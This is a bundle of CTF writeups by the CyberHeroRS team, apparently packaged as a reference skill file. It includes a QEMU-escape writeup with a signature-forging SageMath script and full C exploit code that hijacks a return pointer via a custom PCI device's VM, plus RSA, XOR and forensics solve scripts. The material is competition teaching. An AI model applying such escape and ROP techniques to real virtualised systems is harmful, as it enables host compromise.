<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-cyberherors
description: CTF writeups and security challenges by CyberHeroRS.
---

# Writeups by CyberHeroRS

Source repository: `/repos/CyberHeroRS`

## Repository Index

- writeups/README.md
- writeups/TFC/README.md
- writeups/TyphonCTF/2023/Hardware/dumbiotpart1/dumbiotpart1.md
- writeups/TJCTF/2023/Crypto/e.md
- writeups/TJCTF/2023/Crypto/keysmith.md
- writeups/TFC/lumapci/README.md
- writeups/SEETF/2023/Express-JavaScript-Security/writeup/writeup.md
- writeups/NahamConCTF/2023/Crypto/rsaoutro.md
- writeups/NahamConCTF/2023/Networks/nobigdeal.md
- writeups/BYUCTF/2023/Crypto/Poem.md
- writeups/BYUCTF/2023/Rev/RevEng.md
- writeups/BYUCTF/2023/Pentest/MI6configuration/mi6configuration-writeup.md
- writeups/AmateursCTF/Forensics/Painfully Deep Flag/painfullydeepflag.md
- writeups/AmateursCTF/Forensics/Rules Iceberg/rulesiceberg.md
- writeups/AmateursCTF/Forensics/zipper/zipper.md
- writeups/AmateursCTF/Crypto/Compact XORs/compactxors.md
- writeups/AmateursCTF/Crypto/You get extra information 1/yougetextrainformation1.md
- writeups/AmateursCTF/Crypto/You get extra information 2/yougetextrainformation2.md

## Writeup Content


### File: writeups/README.md

# writeups
Writeups from CTFs that CyberHero team participated



### File: writeups/TFC/README.md

# PWN
* [(HARD) LUMAPCI](./lumapci/README.md)



### File: writeups/TFC/lumapci/README.md

# Lumapci

- Author: `Livian`
- Description:

```
Luma failed maths so I made him a PCI card that will help him do some calculations. Don't think you can exploit it because it only runs my signed firmware :3.
```

Files: [lumapci.zip](./lumapci.zip)

## Overview

![File structure](./images/file_structure.png)

From the provided docker file and entrypoint script, we can see that our docker runs the Linux kernel and file system compiled by `qemu_builder` profile in `Challenge.dockerfile` with precompiled qemu binary. The flag is stored in docker's file system. This would mean this challenge requires us to do QEMU escape.

![Dockerfile](./images/docker.png)
![entrypoint.sh](./images/entrypoint.png)

## qemu-system-x86_64

After we opened qemu-system-x86_64 in Binary Ninja we notice that there are multiple functions with `luma` keyword.

![QEMU Functions](./images/qemu_functions.png)

### Init

From the function `luma_class_init`, we can see that `pci-device` is registered.

![luma_class_init](./images/luma_class_init.png)

After some research we figured out that this function closely resembles QEMU's [edu device](https://github.com/qemu/qemu/blob/master/hw/misc/edu.c)

```c
static void edu_class_init(ObjectClass *class, void *data)
{
    DeviceClass *dc = DEVICE_CLASS(class);
    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);

    k->realize = pci_edu_realize;
    k->exit = pci_edu_uninit;
    k->vendor_id = PCI_VENDOR_ID_QEMU;
    k->device_id = 0x11e8;
    k->revision = 0x10;
    k->class_id = PCI_CLASS_OTHERS;
    set_bit(DEVICE_CATEGORY_MISC, dc->categories);
}
```

With this information we can change the types on `rax` and `rax_1` with Binary Ninja's `Change Type` feature to make this function much more readable. Now we can notice that only `device_id` differs from the default edu implementation.

![luma_class_init_renamed](./images/luma_class_init_renamed.png)

## Read

![luma_mmio_read](./images/luma_mmio_read.png)

Continuing with our analysis on `luma_mmio_read` function, in similar fashion we can compare with the edu implementation.

```c
static uint64_t edu_mmio_read(void *opaque, hwaddr addr, unsigned size)
{
    EduState *edu = opaque;
    uint64_t val = ~0ULL;

    if (addr < 0x80 && size != 4) {
        return val;
    }

    if (addr >= 0x80 && size != 4 && size != 8) {
        return val;
    }

    switch (addr) {
    case 0x00:
        val = 0x010000edu;
        break;
    case 0x04:
        val = edu->addr4;
        break;
    case 0x08:
        qemu_mutex_lock(&edu->thr_mutex);
        val = edu->fact;
        qemu_mutex_unlock(&edu->thr_mutex);
        break;
    case 0x20:
        val = qatomic_read(&edu->status);
        break;
    case 0x24:
        val = edu->irq_status;
        break;
    case 0x80:
        dma_rw(edu, false, &val, &edu->dma.src, false);
        break;
    case 0x88:
        dma_rw(edu, false, &val, &edu->dma.dst, false);
        break;
    case 0x90:
        dma_rw(edu, false, &val, &edu->dma.cnt, false);
        break;
    case 0x98:
        dma_rw(edu, false, &val, &edu->dma.cmd, false);
        break;
    }

    return val;
}
```

We can see that that the luma implementation has much less addr cases `0x50-0xcf`, `0x120` and `0x140`.

- `0x50-0xcf` Is reading registers
- `0x120` is reading 8 bytes from firmware write pointer
- `0x140` is validating signature

We also have this object at variable `rax` that in edu implementation is called `EduState`.

After some searching of types in Binary Ninja `Types` view, we notice a type named `LumaState`.
![LumaState](./images/LumaState.png)

When we change type of rax to `struct LumaState*` we can see that it perfectly matches and gives us meaningful decompilation.

![luma_mmio_read_renamed](./images/luma_mmio_read_renamed.png)

## Write

![luma_mmio_write](./images/luma_mmio_write.png)

Similarly, to read we can map our object to `struct LumaState*`.

And again we see some special addr cases that are not present in edu implementation: `0x50-0xcf`, `0xd8-0x117`, `0x120`, `0x128` and `0x138`.

- `0x50-0xcf` is setting registers
- `0xd8-0x117` is writing 8 bytes into firmware write pointer
- `0x120` is setting firmware write pointer
- `0x128` is validating signature and executing vm
- `0x138` is resetting firmware state and setting its length

## VM

Another interesting function here is `vm_execute` that is called on `LumaState` object. Similar to many `vm` challenges there is a big switch case with handlers for executing vm instructions.

![VM](./images/vm.png)

After some analysis we can see that each instruction is encoded in short int (2 bytes) with 4 nibbles in order: `opcode`, `operand1`, `operand2`, `constant`.

```rust
pub fn instr(opcode: u8, op1: u8, op2: u8, cnst: u8) -> u16 {
    (opcode as u16) << 12 | (op1 as u16) << 8 | (op2 as u16) << 4 | cnst as u16
}
```

And we can map opcodes like this:

```rust
//exit
const opc_ret: u8 = 0;
//reg[op1] = firmware[reg[op2]]
const opc_load: u8 = 1;
//firmware[reg[op2]] = reg[op1]
const opc_store: u8 = 2;
//reg[op1] = reg[op2] + reg[op1]
const opc_add: u8 = 3;
//reg[op1] = reg[op2] - reg[op1]
const opc_sub: u8 = 4;
//reg[op1] = reg[op2] & reg[op1]
const opc_and: u8 = 5;
//reg[op1] = reg[op2] | reg[op1]
const opc_or: u8 = 6;
//reg[op1] = reg[op2] ^ reg[op1]
const opc_xor: u8 = 7;
//pc = reg[op1]
const opc_jmp: u8 = 8;
//if reg[op2] != 0 => pc = reg[op1]
const opc_ceq: u8 = 9;
//if reg[op2] == 0 => pc = reg[op1]
const opc_cne: u8 = 0xA;
//reg[op1] = reg[op2] << const
const opc_shl: u8 = 0xB;
//reg[op1] = reg[op2] >> const
const opc_shr: u8 = 0xC;
//reg[op1] = reg[op1] + 1
const opc_inc: u8 = 0xD;
//reg[op1] = reg[op1] - 1
const opc_dec: u8 = 0xE;
//nop
const opc_nop: u8 = 0xF;
```

(There is a total of 16 registers)

### Validate signature

There is a function called `validate_signature` that is called before vm_execute

![validate_signature](./images/validate_signature.png)

What this function does is split code into chunks of 64 bytes, performs sha512 on those chunks and xors those hashes into one `checksum` and finally compares the checksum with constant values.

This would be rust equivalent:

```rust
use sha2_const::Sha512;

fn sha512(data: &[u8]) -> [u8; 64] {
    Sha512::new().update(data).finalize()
}

fn checksum(data: &[u8]) -> [u8; 64] {
    data.chunks(64)
        .map(|c| sha512(&c))
        .fold([0u8; 64], |mut acc, hash| {
            for (a, b) in acc.iter_mut().zip(hash.iter()) {
                *a ^= b;
            }
            acc
        })
}

fn validate_signature(data: &[u8]) -> bool {
    let checksum = checksum(data);

    let target_checksum = hex::decode("7d2d3d2d3faec8204d6e4e25671680f4fb0b219032c7aa1c8eb900a91931b8b0a92840d4fb36a81c5fd280f453993a97ad395bf009680b9d265df770c896ccd0").unwrap();

    return &checksum[..] == &target_checksum;
}
```

### Win Function

The author of this challenge was nice enough to add a win function:
![luma_math_hacks](./images/luma_math_hacks.png)

## Overview

To reiterate, we need to:

- Create a driver to communicate with `luma_qemu_device`
- Bypass `validate_signature`
- Create VM code to exploit luma_device

## Interacting with `luma`

Searching online, we found a driver (https://github.com/maxerenberg/qemu-edu-driver) for the edu device, which we used as a starting point.

We had to modify `PCI_DEVICE_ID` to our new id 0x1337. We had to remove `irq_handler` because it was crashing the kernel. Additionally, we wrote read/write that used 8-byte `readq`/`writeq` instead of `readl`/`writel` that the original driver used, because the device only supports 8-byte read/writes.

To build the driver, we had to clone Linux:

```bash
git clone --depth=1 --branch=v6.10 https://github.com/torvalds/linux.git linux
cd linux
make defconfig
make
git clone https://github.com/maxerenberg/qemu-edu-driver module
```

We will later need to build the module with the kernel from within the Docker container.  
The author purposefully left this image, so that Linux would be 6.10.0-dirty and that you wouldn't be able to load drivers that do not match this exact kernel name/build environment:  
![dirty](./images/dirty.png)

After you build the module and the kernel, you can boot into it.  
On our system, we had to add:

```
./qemu-system-x86_64 \
    -L /usr/share/qemu/ \
```

### Doing everything in userland

A fun fact we learned after the competition ended from @raindropbreeze (TFC Discord), is that writing the kernel driver was not even necessary. Since we only performed I/O operations on memory, we could have simply `mmap`ed the pci memory and operated on it. This would have saved us a couple of hours:

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>

static inline void barrier() {
    __asm__ volatile (
        ""
        :::"memory"
    );
}

static uint64_t volatile* mmio_base;

static void init() {
    int mmio_fd = open("/sys/bus/pci/devices/0000:00:03.0/resource0", O_SYNC|O_RDWR);
    mmio_base = (uint64_t*) mmap(0, 0x200, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0);

    if (mmio_base == MAP_FAILED) {
        perror("wtf where the hell is our luma");
        exit(1);
    }

    printf("mmio mmap'ped: %p\n", mmio_base);
    barrier();
}

static void mmio_write(int offset, uint64_t val) {
    assert(offset % 8 == 0);
    mmio_base[offset / 8] = val;
}

static uint64_t mmio_read(int offset) {
    assert(offset % 8 == 0);
    return mmio_base[offset / 8];
}

#define FW_FLUSH_POS_OFF 0x120
static void set_fw_flush_pos(uint64_t pos) {
    mmio_write(FW_FLUSH_POS_OFF, pos);
}

static uint64_t get_fw_flush_pos() {
    return mmio_read(FW_FLUSH_POS_OFF);
}

#define FW_LEN_OFF 0x138
static void set_fw_len(uint64_t len) {
    mmio_write(FW_LEN_OFF, len);
}

#define VAL_SIG_OFF 0x140
static int validate_sig() {
    return (int) mmio_read(VAL_SIG_OFF);
}

int main() {
    init();

    printf("%d\n", validate_sig());


    return 0;
}
```

## Bypassing `validate_signature`

This obstacle is what got most teams stuck.

### Creating a valid signature

Since `checksum` was generated by xoring multiple sha512 hashes, what we could do is generate a large number of random hashes and try to find a combination of hashes such that when xored together, we get the target checksum.

We could achieve this by thinking of sha512 as a polynomial of order 64 and try to solve this linear equation to get hashes that when xored together give us the required checksum.

We did this by creating a matrix of random hashes and used SageMath's `solve_right` function to solve the linear equation.

```py
from sage.all import *

target = [
bytes.fromhex("20C8AE3F2D3D2D7D")[::-1],
bytes.fromhex("F4801667254E6E4D")[::-1],
bytes.fromhex("1CAAC73290210BFB")[::-1],
bytes.fromhex("B0B83119A900B98E")[::-1],
bytes.fromhex("1CA836FBD44028A9")[::-1],
bytes.fromhex("973A9953F480D25F")[::-1],
bytes.fromhex("9D0B6809F05B39AD")[::-1],
bytes.fromhex("D0CC96C870F75D26")[::-1]]

target_raw = b"".join(target)

from hashlib import sha512
from random import randbytes as rb

from sage.all import GF, matrix, vector
F = GF(2)
src = [rb(64) for _ in range(512*8*2)]
hashed = [list(map(F, "{:0512b}".format(int(sha512(x).hexdigest(),16)))) for x in src]
target = list(map(F, "{:0512b}".format(int(target_raw.hex(),16))))
m = matrix(F, hashed)
v = vector(F, target)
print(m.dimensions())
print(len(v))
sol = m.T.solve_right(v)

payload = b""
res = int(target_raw.hex(), 16)
for idx, bit in enumerate(sol):
    if bit == 1:
        payload += src[idx]
        res ^= int(sha512(src[idx]).hexdigest(), 16)

assert res == 0, "hashes not 0"
print(len(payload))
if input("> ").lower() == "y":
    print(payload.hex())
```

### Creating valid VM code

Now that we have a valid "magic blob" of bytes that passes `validate_signature`, we need to add vm instructions.

We managed to solve this by creating a block of bytes **(64 byte aligned)**, adding our exploit instructions there and then duplicating it. What this means is that both blocks would have the same hash, resulting in a 0 after they are xored together and ultimately not affecting the checksum at all.

Overall what this means, is that we can layout our code as a VM instruction block, a copy of the same instruction block and then our "magic blob".

![Blob](./images/blob.png)

## VM Exploitation

Finally we get to the PWN part of this challenge.  
If we check our analysis of `vm_execute`, we can see that we have arbitrary read and arbitrary write from our copy of `LumaState.firmware` bytes on stack. This means that we can read and modify the return pointer of `vm_execute` and redirect it to the win function `luma_math_hacks`.

### Exploit

We created 2 vm programs.

First shellcode is:

```
opc_load r1, r0
opc_ret
```

we used
`pciwrite(0x50, 0x100000 + 0x28)` to set `r0` to return pointer offset
and called `pciwrite(0x128, 1)` to execute vm.

Next, we read `r1` using `pciread(0x58)` to get return pointer leak.

The next vm program is to set the return pointer to some `ret` instruction to align the stack and the following address for ROP is the win function (`luma_math_hacks`).

```
opc_store r1, r0
opc_store r3, r2
opc_ret
```

we had to set register `r1` to our chosen `ret` instruction,
`r3` to the win function address (generated from the leaked function) and `r0` and `r2` to stack offsets.

Full code can be found at: [exploit](https://github.com/CyberHeroRS/writeups/tree/main/TFC/lumapci/exploit)

```c
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "edu.h"
#include <stdint.h>

#define SHELLCODE_LEN 128
uint8_t shellcode[SHELLCODE_LEN] = {0, 17, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 17, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

#define SHELLCODE_LEN1 128
uint8_t shellcode1[SHELLCODE_LEN1] = {0, 33, 32, 35, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 33, 32, 35, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};


#define CHECKSUM_LEN 18176
uint8_t checksum[CHECKSUM_LEN] = { /*magic blob*/};


static const char *const device_path = "/dev/edu";

static bool parse_int_arg(const char *s, unsigned long long int *val)
{
	const bool is_hex = s[0] == '0' && (s[1] == 'x' || s[1] == 'X');
	return sscanf(s, is_hex ? "%llx" : "%llu", val) == 1;
}

int fd;
int ret;

uint64_t pciread(uint64_t address)
{
	uint64_t addr = address;
	uint64_t val = 0;
	ret = ioctl(fd, EDU_IOCTL_IDENT, &addr);
	if (ret) {
		printf("read ioctl error\n");
		exit(-1);
	}
	return val;
}

uint64_t pciwrite(uint64_t address, uint64_t value)
{
	uint64_t addr = address;
	uint64_t val = value;
	ret = ioctl(fd, EDU_IOCTL_LIVENESS, &addr);
	if (ret) {
		printf("write ioctl error\n");
	}
	return val;
}

uint64_t set_fw_w_addr(uint64_t value)
{
	return pciwrite(0x120, value);
}

uint64_t set_fw_len(uint64_t value)
{
	return pciwrite(0x138, value);
}

uint64_t write_byte(uint64_t value)
{
	return pciwrite(0xd8, value);
}

void write_checksum()
{
	set_fw_len(0x10000);
	for (size_t i = 0; i < CHECKSUM_LEN; i += 8) {
		set_fw_w_addr(0x4000 + i);
		write_byte(*(uint64_t *)&checksum[i]);
	}
}

void exploit()
{
	write_checksum();

	for (size_t i = 0; i < SHELLCODE_LEN; i += 8)
	{
		set_fw_w_addr(i);
		write_byte(*(uint64_t *)&shellcode[i]);
	}

	uint64_t rsp_off = 0x100000 + 0x28;
	pciwrite(0x50, rsp_off);
	pciwrite(0x128, 1);

	uint64_t leak = pciread(0x58);
	printf("firmware [] = %llx\n", (unsigned long long int)leak);

	// second part
	uint64_t offset_ret = 0xffffffffffda7e23;
	uint64_t offset_win = 0xffffffffffda869c;
	pciwrite(0x50, rsp_off);
	pciwrite(0x58, leak + offset_ret);
	pciwrite(0x60, rsp_off + 8);
	pciwrite(0x68, leak + offset_win);

	for (size_t i = 0; i < SHELLCODE_LEN1; i += 8)
	{
		set_fw_w_addr(i);
		write_byte(*(uint64_t *)&shellcode1[i]);
	}
	pciwrite(0x128, 1);
}
```

In the end, we transferred our driver and cli tool and got the flag `TFCCTF{7h4nk_y0u_c4d37_y0u_w0n_7h3_3mu_w4r_92u83cj545d}`

![Flag](./images/flag.png)

## Final Thoughts

This challenge involved four members of our team and we are looking forward to seeing more of them like this in the next CTF. Thanks to TFC for another set of awesome challenges this year!

Unfortunately, this time we finished fourth. Although we solved all rev/pwn/crypto/forensics challenges (rip misc).

![challenges](./images/challenges.png)



### File: writeups/AmateursCTF/Crypto/Compact XORs/compactxors.md

## Crypto/Compact XORs

>Author: skittles1412
>
>294 solves / 246 points

*Note: Below you'll find a guided solution. If interested just in the solve script, click [here](#solve-script-cryptocompactxors)*

#### The Challenge

The challenge states:

```I found some hex in a file called fleg, but I'm not sure how it's encoded. I'm pretty sure it's some kind of xor...```

We are also given a file called `fleg`, which when opened containts some hex digits:

```610c6115651072014317463d73127613732c73036102653a6217742b701c61086e1a651d742b69075f2f6c0d69075f2c690e681c5f673604650364023944```

The first thing i tried is decoding the hex string to see what the output would be and that is when i noticed that i already have half off the flag with every second character being a non printable byte:

```a a e r C F s v s s a e b t p a n e t i _ l i _ i h _ 6 e d 9 ```

#### Getting the full flag


After a bit off tinkering i tried XOR-ing the bytes of the hex string in various ways, and after trying to XOR neighbouring hex number pairs i got some printable output:

![alt text](./xor.png "The output of XOR-ing the first two hex number pairs")

### Solve script (Crypto/compactxors)

Using the rule of XOR-ing neighbouring i wrote a python script to iterate through the entire string:

```python
#!/bin/python

from pwn import xor

f = open("fleg")

flagEncoded = f.read().strip()

flag = b""

for i in range (0, len(flagEncoded) - 3, 4):
    flag += bytes.fromhex(flagEncoded[i:i+2])
    flag += xor(bytes.fromhex(flagEncoded[i:i+2]), bytes.fromhex(flagEncoded[i+2:i+4]))

print (flag.decode())

```
After running the script we get the decrypted output: `amateursCTF{saves_space_but_plaintext_in_plain_sight_862efdf9}`.



### File: writeups/AmateursCTF/Crypto/You get extra information 1/yougetextrainformation1.md

## Crypto/yougetextrainformation1

>Author: hellopir2
>
>239 solves / 298 points

*Note: Below you'll find a guided solution. If interested just in the solve script, click [here](#solve-script-cryptoyougetextrainformation1)*

#### The Challenge

There isn't any text for the challenge just the provided screenshot:

![alt text](./challenge.png "The output of XOR-ing the first two hex number pairs")


Provided for download are two challenge files: `main.py` and `output.txt`. When we open `main.py` we can see the following code:

```python
from Crypto.Util.number import *
from flag import flag

p = getPrime(512)
q = getPrime(512)
n = p*q
p = p + q
e = 0x10001

extra_information = p + q
ptxt = bytes_to_long(flag)
c = pow(ptxt, e, n)

with open('output.txt', 'w') as f:
    f.write(f"n: {n}\nc: {c}\ne: {e}\nextra_information: {extra_information}")
```

We can see here that this is a pretty simple RSA implementation with just extra information given on the side and by the looks of it by using that extra infromation we'll be able to derieve p and q. And if we take a look into the output file we get exactly what's expected:

```python
n: 83790217241770949930785127822292134633736157973099853931383028198485119939022553589863171712515159590920355561620948287649289302675837892832944404211978967792836179441682795846147312001618564075776280810972021418434978269714364099297666710830717154344277019791039237445921454207967552782769647647208575607201
c: 55170985485931992412061493588380213138061989158987480264288581679930785576529127257790549531229734149688212171710561151529495719876972293968746590202214939126736042529012383384602168155329599794302309463019364103314820346709676184132071708770466649702573831970710420398772142142828226424536566463017178086577
e: 65537
extra_information: 26565552874478429895594150715835574472819014534271940714512961970223616824812349678207505829777946867252164956116701692701674023296773659395833735044077013
```


#### Derieving p and q

By looking at the code we notice one important thing:

```python
n = p*q
p = p + q
e = 0x10001

extra_information = p + q
```

We can use this to derieve p or q just by using some simple math. If we have:

$$n = p * q$$

$$p = p + q$$

$$extra_information = p + q$$

We can combine these equations like:

$$extra_information = p + 2 * q$$

$$p = extra_information - 2 * q$$

$$n = (extra_information - 2 * q) * q$$

$$-2 * q^{2} + extra_information * q - n = 0$$

This is now a basic quadratic equation that we can solve for q. I used [SageMath](https://www.sagemath.org/) to do that:

```python
eq = -2*x^2 + 2656... * x - 8379... == 0

solve(eq, x)

[x == 8128..., x == (1030.../2)]
```

Since only one of the solutions is a whole number i took that as value for q and now i can write the script to decypher the cyphertext.

### Solve script (crypto/yougetextrainformation1)

Here we can just take all the values given in the `output.txt` file and the value for q we calculated and code them into the script. Finally we can just use standard RSA to decrypt the flag:

```python
#!/bin/python
from Crypto.Util.number import *

n = 83790217241770949930785127822292134633736157973099853931383028198485119939022553589863171712515159590920355561620948287649289302675837892832944404211978967792836179441682795846147312001618564075776280810972021418434978269714364099297666710830717154344277019791039237445921454207967552782769647647208575607201
c = 55170985485931992412061493588380213138061989158987480264288581679930785576529127257790549531229734149688212171710561151529495719876972293968746590202214939126736042529012383384602168155329599794302309463019364103314820346709676184132071708770466649702573831970710420398772142142828226424536566463017178086577
e = 65537
extra_information = 26565552874478429895594150715835574472819014534271940714512961970223616824812349678207505829777946867252164956116701692701674023296773659395833735044077013

q = 8128979845892982561867353232387733688040820165501281055994560204992985831326225951788922087412585314864187432126945670029964128100746510232539453211798711

p = extra_information - 2 * q

phi = (p-1) * (q-1)

d = inverse(e, phi)

m = pow(c, d, n)

print (long_to_bytes(m).decode())

```
After running the script we get the decrypted output: `amateursCTF{harder_than_3_operations?!?!!}`.



### File: writeups/AmateursCTF/Crypto/You get extra information 2/yougetextrainformation2.md

## Crypto/yougetextrainformation2

>Author: hellopir2
>
>179 solves / 359 points

*Note: Below you'll find a guided solution. If interested just in the solve script, click [here](#solve-script-cryptoyougetextrainformation2)*

#### The Challenge

The challenge states:

```You get more information! More complicated = more information right.```

Provided for download are two challenge files: `main.py` and `output.txt`. When we open `main.py` we can see the following code:

```python
from Crypto.Util.number import *
from flag import flag

p = getPrime(512)
q = getPrime(512)
n = p*q
e = 0x10001
extra_information = (n**2)*(p**3 + 5*(p+1)**2) + 5*n*q + q**2
ptxt = bytes_to_long(flag)
c = pow(ptxt, e, n)

with open('output.txt', 'w') as f:
    f.write(f"n: {n}\nc: {c}\ne: {e}\nextra_information: {extra_information}")
```

Like in the first part of this challenge we get a standard RSA implementation and some extra information that will help us get teh flag. And if we take a look into the output file we get exactly what's expected:

```python
n: 95593382112797270045497836514999308524326160650345266525670495575191979116591752182138270308274446464071024826510473429700676303637674960212123982700153540490805215151070356646141514736282385755143090035980011032465519861526291865888128545478530962058792257703950616556136479933021373472378679162332202365371
c: 92084942302809419329882275131365664619817865820237979575321652348851871468885232665120732298048355621943772250718055278615366362227084559410831820721620242260588398786014654743749734106956509345330468686120026908164376320923131751798117799981744551407234489862207435686504148347452579942637697333568788391594
e: 65537
extra_information: 18247071175606431398122118602371784578875472790915317892207044424588309397797319375039984309368393267673885302107217184699052743790470091033147110959310433418937324145720036262540098007724458652548486534453030546582214242131458903058169536052488501597969216020092796160475487905223265691093061136660574497410399108890645909789835984721231354187679269066357591297035974333220513134895660609801438138623213711900681512310067292949714127564635579383633589101296120704659647911638787823818973909534106275908594589830353183557722172234952579827423906720754070119865452363350814918812923981729393142874903734028229195885438296963982680724071663211427931391032589901737528717167662646147224323491202696402122261699504048973334902281462240308032014697804531871922566779026958815207465755155123070196922127199447785648102152027431894178737946151518726929361221425189695069653652163012000609320105988830299015364692678902927254273154427301473090465612473379114039284029813071586214536353994345527805408387636097772645156970939979500155578289301143563369142329343932852167241705090287661795
```


#### Derieving p and q

This time the information we got is much more complex and needs to be used a bit differently. But before writing a solution script the data we got needs to be formatted a bit:

$$extra_information = n^{2} * (p^{3} + 5 * (p + 1)^{2}) + 5 * n * q + q^{2}$$

$$n = p * q$$

$$(p + 1)^{2} = p^{2} + 2 * p + 1$$

We can combine these equations like:

$$extra_information = p^{2} * q^{2} * (p^{3} + 5 * (p + 1)^{2}) + 5 * p * q * q + q^{2}$$

$$extra_information = (p^{5}) * (q^{2}) + 5 * (p^{4}) * (q^{2}) + 10 * (p^{3}) * (q^{2}) + 5 * (p^{2}) * (q^{2}) + 5 * (q^{2}) * p + (q^{2})$$

With the extra_information simplified we can now use [Z3](https://github.com/Z3Prover/z3) to write the solution script.

### Solve script (crypto/yougetextrainformation2)

To get the solution we just take the values from `output.txt` file and implement them into a Z3 solver:

```python
#!/bin/python
from Crypto.Util.number import *
import z3

n= 95593382112797270045497836514999308524326160650345266525670495575191979116591752182138270308274446464071024826510473429700676303637674960212123982700153540490805215151070356646141514736282385755143090035980011032465519861526291865888128545478530962058792257703950616556136479933021373472378679162332202365371
c= 92084942302809419329882275131365664619817865820237979575321652348851871468885232665120732298048355621943772250718055278615366362227084559410831820721620242260588398786014654743749734106956509345330468686120026908164376320923131751798117799981744551407234489862207435686504148347452579942637697333568788391594
e= 65537
extra_information= 18247071175606431398122118602371784578875472790915317892207044424588309397797319375039984309368393267673885302107217184699052743790470091033147110959310433418937324145720036262540098007724458652548486534453030546582214242131458903058169536052488501597969216020092796160475487905223265691093061136660574497410399108890645909789835984721231354187679269066357591297035974333220513134895660609801438138623213711900681512310067292949714127564635579383633589101296120704659647911638787823818973909534106275908594589830353183557722172234952579827423906720754070119865452363350814918812923981729393142874903734028229195885438296963982680724071663211427931391032589901737528717167662646147224323491202696402122261699504048973334902281462240308032014697804531871922566779026958815207465755155123070196922127199447785648102152027431894178737946151518726929361221425189695069653652163012000609320105988830299015364692678902927254273154427301473090465612473379114039284029813071586214536353994345527805408387636097772645156970939979500155578289301143563369142329343932852167241705090287661795

p, q = z3.Ints('p q')

solver = z3.Solver()

solver.add(extra_information == (p**5)*(q**2)+5*(p**4)*(q**2)+10*(p**3)*(q**2)+5*(p**2)*(q**2)+5*(q**2)*p+(q**2), n == p * q)

if (solver.check() == z3.sat):

    p = solver.model()[p].as_long()
    q = solver.model()[q].as_long()

    phi = (p-1) * (q-1)

    d = inverse(e, phi)

    flag = pow(c, d, n)

    print(long_to_bytes(flag).decode())

```
After running the script we get the decrypted output: `amateursCTF{omg_it's_my_favorite_epic_thing_where_it_looks_like_a_binomial!!}`.



### File: writeups/AmateursCTF/Forensics/Painfully Deep Flag/painfullydeepflag.md

## Forensics/painfullydeepflag

>Author: smashmaster
>
>126 solves / 410 points

The challenge states:

```This one is a bit deep in the stack.```

And we are provided a file `flag.pdf` for download. When We open the file we are get the following screen:

![alt text](./openedpdf.png "Contents of the PDF file")

After doing some analysis i tried running `pdf-parser` on it and got the following results:

```
...
obj 7 0
 Type: /XObject
 Referencing: 20 0 R, 21 0 R
 Contains stream

  <<
    /Type /XObject
    /Subtype /Image
    /Width 760
    /Height 342
    /BitsPerComponent 8
    /Length 20 0 R
    /Filter /FlateDecode
    /ColorSpace /DeviceRGB
    /SMask 21 0 R
  >>


obj 20 0
 Type:
 Referencing:



obj 21 0
 Type: /XObject
 Referencing: 22 0 R
 Contains stream

  <<
    /Type /XObject
    /Subtype /Image
    /Width 760
    /Height 342
    /BitsPerComponent 8
    /Length 22 0 R
    /Filter /FlateDecode
    /ColorSpace /DeviceGray
    /Decode [ 1 0 ]
  >>
...
```

This showed me that there may be more images in the file than I'm seeing so I tried running `pdfextract` on it and got some results:

```
Extracted 10 PDF streams to 'flag.dump/streams'.
Extracted 0 scripts to 'flag.dump/scripts'.
Extracted 0 attachments to 'flag.dump/attachments'.
Extracted 1 fonts to 'flag.dump/fonts'.
Extracted 4 images to 'flag.dump/images'.
```

After looking through the images I managed to extract I found the flag:

![alt text](./flag.png "The flag image")

`amateursCTF{0ut_0f_b0unds}`.



### File: writeups/AmateursCTF/Forensics/Rules Iceberg/rulesiceberg.md

## Forensics/rulesiceberg

>Author: stuxf
>
>154 solves / 377 points

*Note: Below you'll find a guided solution. If interested just in the solve script, click [here](#solve-script-forensicsrulesiceberg)*

#### The Challenge

In this challenge we are presented with a screenshot of a Discord conversation and following description:

```So apparently larry leaked this challenge already. Due to high demand for rules-iceberg stego and server profile picture discord stego, I've decided to release the challenge anyways.```

![alt text](./larry-screenshot.png "The conversation")

With that screenshot we are given three files: `rules-iceberg.png`, `new-rules-iceberg.png` and `generate.py`.

Opening the `generate.py` file we are presented with the following code:

```python
from PIL import Image

def encode_lsb(image_path, message):
    # Open the image
    image = Image.open(image_path)
    pixels = image.load()

    # Check if the message can fit within the image
    if len(message) * 8 > image.width * image.height:
        raise ValueError("Message is too long to fit within the image.")

    # Convert the message to binary
    binary_message = ''.join(format(ord(char), '08b') for char in message)

    # Embed the message into the image
    char_index = 0
    for y in range(image.height):
        for x in range(image.width):
            r, g, b, a = pixels[x, y]

            if char_index < len(binary_message):
                # Modify the second least significant bit of the red channel
                # only if red is greater than green and blue
                if r > g and r > b:
                    r = (r & 0xFD) | (int(binary_message[char_index]) << 1)
                    char_index += 1

